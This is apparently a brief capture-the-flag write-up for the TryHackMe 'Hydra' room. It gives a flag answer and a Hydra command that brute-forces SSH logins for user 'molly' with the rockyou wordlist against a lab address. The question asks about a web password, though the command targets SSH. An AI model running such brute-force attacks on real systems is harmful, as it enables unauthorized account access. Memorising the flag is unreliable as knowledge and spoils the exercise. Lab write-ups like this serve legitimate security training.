# <div align="center">[Hydra](https://tryhackme.com/r/room/hydra)</div>


# Use Hydra to bruteforce molly's web password. What is flag 1?


```
THM{2673a7dd116de68e85c48ec0b1f2612e
```



```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 50 
```
